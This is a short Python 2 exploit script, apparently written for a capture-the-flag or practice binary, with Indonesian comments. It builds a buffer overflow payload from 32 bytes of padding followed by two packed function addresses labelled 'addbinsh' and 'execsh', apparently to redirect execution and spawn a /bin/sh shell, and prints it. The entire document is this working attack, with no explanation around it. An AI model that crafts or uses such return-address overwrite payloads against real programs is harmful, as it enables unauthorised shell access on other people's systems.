from struct import *

dummy = "A"*32
addbinsh = pack("I", 0x000011d8) # Alamat addbinsh
execsh = pack("I", 0x000011ad) # Alamat execsh

payload = dummy + addbinsh + execsh
print payload